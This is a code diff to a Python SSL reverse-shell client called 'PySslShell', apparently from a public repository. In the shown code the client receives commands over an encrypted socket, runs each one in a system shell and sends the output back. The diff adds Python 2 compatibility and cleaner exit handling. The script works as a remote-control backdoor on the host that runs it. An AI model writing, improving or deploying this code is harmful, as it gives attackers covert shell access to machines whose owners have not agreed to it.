@@ -1,7 +1,13 @@
+"""
+PySslShell Client - Python2/3 Compatible
+Author: Darkerego <https://github.com/darkerego>
+"""
+
 import os
 import socket
 import subprocess
 import ssl
+
 
 # Create a socket
 def socket_create():
@@ -40,13 +46,18 @@ def receive_commands():
             if data[:2].decode("utf-8") == 'cd':
                 os.chdir(data[3:].decode("utf-8"))
             if len(data) > 0:
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output_bytes = cmd.stdout.read() + cmd.stderr.read()
                 output_str = output_bytes.decode('utf-8')
-                ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
-                # print(output_str)
+                try:
+                    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                except TypeError:
+                    output_str = str(output_bytes)  # For Python2 compatibility
+                    ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
         except KeyboardInterrupt:
             ssls.close()
+            exit(0)
 
 
 def main():
